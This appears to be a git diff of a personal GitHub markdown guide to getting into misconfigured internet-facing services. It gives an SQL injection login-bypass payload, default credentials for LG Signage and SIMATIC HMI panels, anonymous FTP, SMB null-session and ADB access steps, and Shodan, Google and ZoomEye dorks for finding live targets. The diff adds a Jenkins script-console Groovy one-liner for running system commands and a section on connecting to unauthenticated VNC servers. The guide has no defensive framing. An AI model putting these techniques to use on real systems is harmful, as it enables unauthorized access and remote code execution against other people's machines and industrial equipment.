@@ -4,9 +4,11 @@
 * [Android debug bridge misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#Android-debug-bridge-misconfiguration)
 * [Find exposed discord webhooks](https://github.com/komodoooo/Some-things/blob/main/papers.md#Find-exposed-discord-webhooks)
 * [FTP servers with anonymous login allowed ](https://github.com/komodoooo/Some-things/blob/main/papers.md#FTP-servers-with-anonymous-login-allowed)
+* [Jenkins code execution](https://github.com/komodoooo/Some-things/blob/main/papers.md#Jenkins-code-execution)
 * [LG Signage default credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#LG-Signage-default-credentials)
 * [SIMATIC HMI_Panel default credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#SIMATIC-HMI_Panel-default-credentials)
 * [SMB server misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#SMB-server-misconfiguration)
+* [VNC Servers with auth disabled](https://github.com/komodoooo/Some-things/blob/main/papers.md#VNC-Servers-with-auth-disabled)
 <br><br>_"A bit of my experience about messing around on the internet"_<br><br>
 # Admin login panels vulnerable to SQLi
 Payload: _`1'or'1'='1`_
@@ -23,7 +25,7 @@ Debian: `apt install android-tools`
 
 Arch: `pacman -S android-tools`
 ### Connect to ADB device
-**Use [this bash script](https://github.com/komodoooo/Some-things/blob/main/tools/adb/adb.sh)** or connect manually
+**Use [this bash script](https://github.com/komodoooo/Some-things/blob/main/tools/adb/adb.sh)** or connect manually (default port is 5555)
 ### Shodan query
 [`"Android debug bridge (ADB)" -Authentication`](https://www.shodan.io/search?query=%22Android+debug+bridge+%28ADB%29%22+-Authentication)
 # Find exposed discord webhooks
@@ -45,6 +47,16 @@ Password: _`guest`_
 ## Find exposed ftp servers on google
 ### Google dork
 [`intitle:"index of" inurl:ftp`](https://www.google.com/search?q=intitle%3A%22index+of%22+inurl%3Aftp)
+# Jenkins code execution
+Select _`Manage Jenkins` > `Console Script`_ (Generally **/script** or **/manage/script**)
+
+Groovy oneliner for injecting system commands:
+
+```groovy
+println("<your cmd>".execute().text)
+```
+###  Zoomeye dork
+[`title:"Dashboard [Jenkins]"+"Manage jenkins"`](https://www.zoomeye.org/searchResult?q=title%3A%22Dashboard%20%5BJenkins%5D%22%2B%22Manage%20jenkins%22)
 # LG Signage default credentials
 ### Login
 Default password: _`00000000`_
@@ -66,3 +78,10 @@ Arch: `pacman -S smbclient`
 `smbclient -N \\\\{address}\\Users`
 ### Shodan query
 [`port:445 "Authentication: disabled" "Users"`](https://www.shodan.io/search?query=port%3A445+%22Authentication%3A+disabled%22+%22Users%22)
+# VNC Servers with auth disabled
+Download **[Vnc viewer](https://www.realvnc.com/en/connect/download/viewer/)**
+Insert the IP address and port (default is 5900) and connect,
+
+select ok when unencrypted connection warning appears.
+### Shodan query
+[`hash:1569903015`](https://www.shodan.io/search?query=hash%3A1569903015)
